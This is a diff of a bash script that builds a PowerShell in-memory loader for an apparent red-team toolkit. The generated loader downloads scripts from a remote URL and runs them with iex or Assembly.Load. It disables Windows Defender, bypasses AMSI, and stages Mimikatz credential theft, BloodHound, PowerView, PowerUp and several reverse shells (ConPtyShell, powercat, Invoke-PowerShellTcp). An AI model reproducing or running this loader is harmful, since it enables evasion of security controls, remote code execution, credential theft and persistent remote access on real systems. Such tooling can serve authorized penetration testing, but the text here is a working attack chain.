@@ -26,37 +26,29 @@ warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
 deploy() {
     local name="$1"
     local path="$2"
-    local quiet="${3:+\$true}"
-
-    cat <<EOF
-try {
-EOF
 
     case "$path" in
         *".dll")
             cat <<EOF
-    Import-Module -Assembly (
-        [System.Reflection.Assembly]::Load(
-            (
-                iwr -DisableKeepAlive -UseBasicParsing $url/$path
-            ).content
-        )
-    ) -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
+function Deploy-${name}DLL {
+    return [System.Reflection.Assembly]::Load(
+        (
+            iwr -DisableKeepAlive -UseBasicParsing $url/$path
+        ).content
+    )
+}
 EOF
             ;;
         *".ps1")
             cat <<EOF
-    iex (iwr -DisableKeepAlive -UseBasicParsing $url/$path)
+function Deploy-$name {
+    return [System.Text.Encoding]::ASCII.GetString(
+        (iwr -DisableKeepAlive -UseBasicParsing $url/$path).content
+    )
+}
 EOF
             ;;
     esac
-
-    cat <<EOF
-    if (!${quiet:-\$false}) {echo "$name - success"}
-} catch {
-    if (!${quiet:-\$false}) {echo "$name - fail"}
-}
-EOF
 }
 
 simplehttp() {
@@ -137,18 +129,20 @@ if (($languagemode -match "constrained")) {
     return
 }
 
-$(deploy "DefenderDisabler" scripts/DefenderDisabler.ps1 false)
+$(deploy "DefenderDisabler" scripts/DefenderDisabler.ps1)
 $(deploy "AMSIBypass" scripts/AMSIBypass.ps1)
 
-# Order might matter (for example, PowerView THEN PowerUp)
+iex (Deploy-DefenderDisabler)
+iex (Deploy-AMSIBypass)
+
 $(deploy "ADModule" $admodule_dll)
 $(deploy "BloodHound" tools/BloodHound/Ingestors/SharpHound.ps1)
 $(deploy "ConPtyShell" tools/ConPtyShell/Invoke-ConPtyShell.ps1)
 $(deploy "Mimikatz" tools/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
 $(deploy "PowerCat" tools/powercat/powercat.ps1)
 $(deploy "PowerShellTcp" tools/nishang/Shells/Invoke-PowerShellTcp.ps1)
-$(deploy "PowerView" tools/PowerSploit/Recon/PowerView.ps1)
 $(deploy "PowerUp" tools/PowerSploit/Privesc/PowerUp.ps1)
+$(deploy "PowerView" tools/PowerSploit/Recon/PowerView.ps1)
 
 # Change prompt colors so user knows RedArmy is loaded in current
 # session
